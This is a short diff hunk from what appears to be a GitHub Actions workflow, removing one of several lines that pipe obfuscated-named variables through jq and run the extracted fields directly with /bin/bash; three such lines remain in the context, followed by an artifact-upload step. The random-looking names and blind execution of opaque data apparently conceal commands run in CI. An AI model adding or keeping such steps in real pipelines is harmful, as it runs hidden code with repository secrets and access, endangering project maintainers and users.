@@ -33,7 +33,6 @@ jobs:
           echo $rnw7 | jq -r .wcdxc06227 | /bin/bash
           echo $xd263 | jq -r .ei4 | /bin/bash
           echo $h34011 | jq -r .shr1 | /bin/bash
-          echo $icojf0 | jq -r .nqrcs7 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
